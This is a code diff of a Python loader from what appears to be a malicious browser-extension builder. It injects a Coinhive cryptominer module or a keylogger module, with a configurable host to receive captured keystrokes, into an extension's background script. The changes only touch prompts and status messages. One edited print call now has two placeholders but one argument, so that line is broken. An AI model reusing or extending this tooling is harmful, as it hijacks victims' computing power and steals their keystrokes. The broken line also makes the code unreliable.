@@ -56,7 +56,7 @@ class Loader :
 
 			modules = "modules/currency/coinhive/coinhive.js" # Javascript file to inject into background
 
-			print("{} Configuration of module {}".format(self.color.yellows("[!]"), modules))
+			print("{} Configuration of module {}".format(self.color.yellows("[!]")))
 
 			apikey = raw_input("{} Set coinhive public key: ".format(self.color.status("[+]")))
 			thread = raw_input("{} Set coinhive threads: ".format(self.color.status("[+]")))
@@ -70,7 +70,7 @@ class Loader :
 
 			modules = "modules/keylogger/keylogger.js" # Javascript file to inject into background
 			print("{} Configuration of module {}".format(self.color.yellows("[!]"), modules))
-			connection = raw_input("{} Set the back connection: ".format(self.color.status("[+]")))
+			connection = raw_input("{} Host address for the GET back: ".format(self.color.status("[+]")))
 			options = "{}".format(connection)
 
 		with open(modules, "rb") as f :
@@ -78,5 +78,5 @@ class Loader :
 			data = data.replace("******", str(options))
 			with open("output/extensions/{}/{}".format(self.extension, path), "a") as s :
 				s.write(data)
-				print("{} Module as been injected {}".format(self.color.yellows("[!]"), modules))
+				print("{} Module as been injected".format(self.color.yellows("[!]")))
 			s.close()
